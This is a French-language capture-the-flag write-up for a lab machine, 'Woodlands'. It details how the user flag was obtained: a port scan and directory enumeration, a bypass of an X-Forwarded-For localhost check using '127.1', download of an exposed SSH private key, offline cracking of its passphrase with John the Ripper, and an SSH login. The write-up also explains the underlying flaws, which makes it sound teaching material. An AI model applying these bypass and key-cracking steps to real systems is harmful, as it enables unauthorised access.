# Woodlands — user.txt

## 1. Flag

```text
EPI{********}
```

## 2. Objectif

L'objectif du challenge est d'obtenir un accès utilisateur sur la machine cible `10.10.0.4` et de récupérer le fichier `user.txt`.

---

## 3. Techniques utilisées

* Reconnaissance réseau
* Énumération des services
* Énumération de répertoires web
* Analyse du contrôle d'accès HTTP
* Bypass de filtrage IP
* IPv4 alternative / notation courte (`127.1`)
* Divulgation d'une clé privée SSH
* Cassage de passphrase offline
* Déchiffrement d'une clé SSH
* Énumération de comptes SSH
* Connexion SSH
* Lecture du flag

---

## 4. Outils utilisés

* `nmap`
* `gobuster`
* `curl`
* `ssh2john.py`
* `john`
* `rockyou.txt`
* `ssh-keygen`
* Python
* Bibliothèque `cryptography`
* `ssh`

---

## 5. Reconnaissance

Un scan complet des ports permet d'identifier les services exposés :

```bash
nmap -sC -sV -p- 10.10.0.4
```

Les services intéressants sont :

* **22/tcp** : SSH — OpenSSH 10.0p2
* **80/tcp** : HTTP — Apache 2.4.68

Le serveur web redirige vers le domaine :

```text
woodlands.epi
```

Le domaine est donc ajouté à la résolution locale afin de pouvoir accéder correctement à l'application web.

---

## 6. Énumération du site web

Une énumération des ressources accessibles permet de découvrir plusieurs fichiers :

```bash
gobuster dir -u http://woodlands.epi -w <wordlist>
```

Les ressources intéressantes découvertes sont notamment :

```text
index.php
join.php
```

Le fichier `join.php` devient le point d'entrée principal de l'exploitation.

---

## 7. Analyse du contrôle d'accès

L'accès à `join.php` dépend de la valeur du header HTTP :

```text
X-Forwarded-For
```

Le serveur vérifie la présence de l'adresse IP locale `127.0.0.1`.

Une requête utilisant directement cette valeur est cependant bloquée et retourne un message indiquant que l'accès est refusé.

Le problème vient du fait que le filtrage repose sur une représentation particulière de l'adresse IPv4 et ne prend pas correctement en compte toutes ses représentations valides.

### Bypass avec `127.1`

L'adresse loopback peut être représentée sous une forme courte :

```text
127.1
```

Cette représentation correspond à `127.0.0.1`, mais n'est pas bloquée par le contrôle mis en place.

La requête suivante permet donc de contourner la restriction :

```bash
curl -H "X-Forwarded-For: 127.1" http://woodlands.epi/join.php
```

Le serveur considère alors la requête comme provenant d'un utilisateur local.

---

## 8. Accès à la page réservée

Après le bypass, la page retourne notamment :

```text
Welcome, Recruit
```

Elle contient également un lien permettant de télécharger une clé RSA :

```text
?download=rsa
```

Le téléchargement fournit le fichier :

```text
marquise_backdoor_rsa
```

La clé est une clé privée **Ed25519 au format OpenSSH**, protégée par une passphrase.

Les informations indiquent notamment l'utilisation de :

```text
aes256-ctr
bcrypt-pbkdf
```

La clé privée peut donc être utilisée pour une authentification SSH, mais sa passphrase doit d'abord être récupérée.

---

## 9. Cassage de la passphrase

Pour casser la passphrase de la clé privée, `ssh2john.py` permet de convertir la clé dans un format exploitable par John the Ripper.

```bash
ssh2john.py marquise_backdoor_rsa > hash.txt
```

Le fichier obtenu contient un hash commençant notamment par :

```text
$sshng$...
```

Une attaque avec la wordlist `rockyou.txt` est ensuite effectuée :

```bash
john --wordlist=rockyou.txt hash.txt
```

La passphrase est trouvée après environ 55 secondes :

```text
rebels
```

La clé peut maintenant être déchiffrée.

---

## 10. Déchiffrement de la clé SSH

Une tentative avec `ssh-keygen` échoue :

```text
error in libcrypto
```

Le problème provient de la compatibilité entre le format de la clé et l'environnement utilisé, notamment avec OpenSSL 3.0.18 / OpenSSH 9.2.

Un contournement consiste à utiliser Python et la bibliothèque `cryptography` pour charger la clé avec sa passphrase.

La fonction utilisée est :

```python
cryptography.hazmat.primitives.serialization.load_ssh_private_key()
```

La clé peut ainsi être chargée avec la passphrase :

```text
rebels
```

puis réexportée sous une forme utilisable par le client SSH.

On obtient alors une clé privée déchiffrée :

```text
id_rsa_decrypted
```

---

## 11. Énumération du compte SSH

Il reste à déterminer quel utilisateur peut utiliser cette clé.

Une énumération de noms d'utilisateurs SSH thématiques est effectuée.

Le compte valide identifié est :

```text
marquise
```

La clé déchiffrée peut donc être utilisée avec ce compte.

---

## 12. Connexion SSH

Connexion à la machine cible :

```bash
ssh -i id_rsa_decrypted marquise@10.10.0.4
```

L'authentification fonctionne et permet d'obtenir un shell avec l'utilisateur :

```text
marquise
```

L'utilisateur possède l'UID :

```text
uid=1000(marquise)
```

---

## 13. Récupération du flag

Le fichier `user.txt` est présent dans le répertoire personnel de l'utilisateur :

```bash
cat /home/marquise/user.txt
```

Le flag obtenu est :

```text
EPI{********}
```

---

## 14. Vulnérabilités identifiées

### 14.1 Contrôle d'accès IP insuffisant

Le serveur fait confiance au header :

```text
X-Forwarded-For
```

pour déterminer si la requête provient de localhost.

Le filtrage ne gère pas correctement les différentes représentations d'une adresse IPv4, ce qui permet de contourner la restriction avec :

```text
127.1
```

Cette vulnérabilité correspond à un **bypass de contrôle d'accès basé sur une validation insuffisante de l'adresse IP**.

### 14.2 Divulgation d'une clé privée SSH

Une fois le contrôle d'accès contourné, l'application permet de télécharger :

```text
marquise_backdoor_rsa
```

Il s'agit d'une clé privée SSH utilisable pour accéder à la machine.

Même si la clé est protégée par une passphrase, sa présence dans une ressource web accessible constitue une fuite de secret sensible.

### 14.3 Passphrase faible

La passphrase de la clé peut être retrouvée offline à l'aide d'une wordlist :

```text
rebels
```

Une clé privée SSH exposée et protégée par une passphrase faible peut donc être compromise sans interaction supplémentaire avec le serveur.

---

## 15. Chaîne d'exploitation

```text
Nmap
  ↓
Apache / woodlands.epi
  ↓
Gobuster
  ↓
join.php
  ↓
Analyse de X-Forwarded-For
  ↓
Bypass avec 127.1
  ↓
Accès "local"
  ↓
Téléchargement de marquise_backdoor_rsa
  ↓
ssh2john.py
  ↓
John the Ripper
  ↓
Passphrase : rebels
  ↓
Déchiffrement de la clé
  ↓
Énumération des utilisateurs SSH
  ↓
Utilisateur : marquise
  ↓
SSH
  ↓
/home/marquise/user.txt
  ↓
EPI{********}
```

---

## 16. Résumé

Le challenge repose principalement sur un **bypass de contrôle d'accès IP**, suivi d'une **divulgation de clé privée SSH**.

La restriction de `join.php` peut être contournée en utilisant la représentation IPv4 courte `127.1`. Cela donne accès à une page permettant de télécharger une clé privée SSH appartenant à l'utilisateur `marquise`.

La passphrase de cette clé est ensuite cassée offline avec John the Ripper. Après avoir contourné un problème de compatibilité lors du déchiffrement de la clé, celle-ci permet de se connecter en SSH avec l'utilisateur `marquise`.

Le fichier `/home/marquise/user.txt` contient finalement le flag :

```text
EPI{********}
```
